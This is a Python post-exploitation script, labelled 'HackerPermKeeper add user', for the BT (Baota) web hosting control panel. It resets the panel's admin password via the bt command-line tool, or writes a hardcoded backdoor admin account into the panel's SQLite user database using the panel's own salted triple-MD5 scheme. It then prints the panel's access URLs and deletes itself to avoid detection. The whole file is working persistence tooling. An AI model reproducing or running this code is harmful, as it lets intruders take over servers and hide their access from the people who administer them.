# -*- coding: utf-8 -*-
# !/usr/bin/env python
from __future__ import print_function
import subprocess
import sys
import re
import os
import sqlite3


def ml(command, input_data=None):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)

    # 如果有输入数据，将其写入子进程的stdin
    if input_data is not None:
        input_data = input_data.encode('utf-8')
        process.stdin.write(input_data)
        process.stdin.flush()

    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def color_title(value):  # 92m 绿色  94m蓝色
    print('\033[92m[+]\033[0m------------------------------------\033[94m{}\033[0m'.format(value))


def color(title=None, value=None):  # 93m 紫色
    if title is not None and value is not None:
        print("\033[93m[+]\033[0m{}: {}".format(title, value))
    else:
        print("\033[93m[+]\033[0m{}".format(title))


def color_red(title=None, value=None):  # 红色
    if title is not None and value is not None:
        print("\033[31m[+]\033[0m{}: {}".format(title, value))
    else:
        print("\033[31m[+]\033[0m{}".format(title))


def ip_host():
    content = ml("bt", input_data="14\n")
    pattern_outer = r'https?://[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+/[a-zA-Z0-9_]+'
    matches_outer = re.findall(pattern_outer, content)
    if matches_outer:
        print("外网: ", matches_outer[0])
        print("内网: ", matches_outer[1])


def bt_x(passwd, file):
    ml('cp {} {}'.format(file[0], file[0] + ".bar"))
    ml('cp {} {}'.format(file[3], file[3] + ".bar"))
    content = ml('echo -e "5\n' + passwd + '" | bt')
    # 定义正则表达式英文
    pattern_credentials = r'-Username: (\w+)\n\|-New password: (\w+)'
    matches_credentials = re.findall(pattern_credentials, content)
    if matches_credentials:
        # Access the first match (assuming there is only one match)
        print("Username:", matches_credentials[0][0])
        print("Password:", matches_credentials[0][1])

    # 定义正则表达式中文  u
    if sys.version_info.major == 2:
        pattern_credentials = u'\|-用户名: (\w+)\n\|-新密码: (\w+)'
    else:
        pattern_credentials = r'\|-用户名: (\w+)\n\|-新密码: (\w+)'
    # 在文本中搜索匹配的部分
    matches_credentials = re.findall(pattern_credentials, content)
    if matches_credentials:
        print("user:   ", matches_credentials[0][0])
        print("passwd: ", matches_credentials[0][1])


def GetRandomString(length):
    #   @name 取随机字符串
    #   @author hwliang<hwl@bt.cn>
    #   @param length 要获取的长度
    #   @return string(length)

    from random import Random
    strings = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    chrlen = len(chars) - 1
    random = Random()
    for i_f in range(length):
        strings += chars[random.randint(0, chrlen)]
    return strings


def triple_md5_encrypt(password, salt):
    import hashlib
    # 对密码进行三次 MD5 哈希，加上盐值
    hashed_password = hashlib.md5(hashlib.md5(
        hashlib.md5(password.encode('utf-8')).hexdigest().encode('utf-8') + '_bt.cn'.encode(
            'utf-8')).hexdigest().encode('utf-8') + salt.encode('utf-8')).hexdigest()
    return hashed_password


def bt_lao(passwd, username, file_path):
    salt = GetRandomString(12)
    passwds = triple_md5_encrypt(passwd, salt)
    connection = sqlite3.connect(file_path)
    cursor = connection.cursor()
    try:
        cursor.execute("SELECT * FROM users;")
        # 获取查询结果
        table_content = cursor.fetchall()
        color(table_content)
        tmp_id_ = int(table_content[-1][0]) + 1

        sql_insert = 'INSERT INTO users (id,username,password,salt) VALUES (?, ?, ?, ?);'
        # 执行 SQL 更新操作
        cursor.execute(sql_insert, (tmp_id_, username, passwds, salt))
        # 提交更改
        connection.commit()

        cursor.execute("SELECT * FROM users;")
        # 获取查询结果
        table_content = cursor.fetchall()
        print('\n--------------------------------------------------\n')
        color_red(table_content)
    except sqlite3.Error:
        pass
    finally:
        # 关闭连接
        if connection:
            connection.close()
    color("user", username)
    color("passwd", passwd)


def delete_current_script():
    try:
        script_paths = os.path.abspath(sys.argv[0])
        os.remove(script_paths)
        print("当前脚本文件已成功删除" + script_paths)
    except Exception as e:
        print("无法删除当前脚本文件：", e)


if __name__ == '__main__':
    print('---------------------{\033[95m[+]HackerPermKeeper add user\033[0m v7.0}-------------')
    files = [
        "/www/server/panel/data/db/panel.db",
        "/www/server/panel/data/db/default.db",
        "/www/server/panel/data/default.db",
        "/www/server/panel/data/db/log.db",
    ]
    user = "adasdmin"
    password = "admin123"
    if os.path.exists(files[0]) and os.path.isfile(files[1]) and os.path.isfile(files[2]) and os.path.isfile(
            files[3]):  # 新的版本
        color_title("new version")
        bt_x(password, files)
    elif not os.path.exists(files[0]) and not os.path.isfile(files[1]) and os.path.isfile(
            files[2]) and not os.path.isfile(files[3]):  # 老版本
        color_title("old version")
        if not os.path.exists("/www/server/panel/plugin/users"):
            ml('mkdir /www/server/panel/plugin/users && touch /www/server/panel/plugin/users/users_main.py')
        bt_lao(passwd=password, username=user, file_path=files[2])
    ip_host()
    delete_current_script()
